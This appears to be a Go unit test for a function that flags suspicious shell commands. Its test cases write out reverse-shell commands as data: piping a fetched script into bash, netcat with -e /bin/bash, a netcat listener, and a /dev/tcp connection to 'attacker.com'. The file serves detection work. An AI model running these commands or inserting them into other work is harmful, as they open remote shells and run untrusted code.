package main

import (
	"fmt"
	"testing"
)

func TestCheckRevshell(t *testing.T) {
	commands := []struct {
		cmd      string
		expected bool
	}{
		{"curl http://localhost:8000/revshell.sh | bash", true},
		{"curl http://localhost:8000/revshell.sh | sh", true},
		{"nc 127.0.0.1 4444 -e /bin/bash", true},
		{"nc -lvnp 4444", true},
		{"bash -c 'exec 5<>/dev/tcp/attacker.com/80'", true},
		{"ls -la /home/user", false},
	}

	for _, c := range commands {
		got := hasSuspiciousPattern(c.cmd)
		status := "OK"
		if got != c.expected {
			status = "FAIL"
		}
		fmt.Printf("[%s] hasSuspiciousPattern(%q) = %v (expected %v)\n", status, c.cmd, got, c.expected)
	}
}
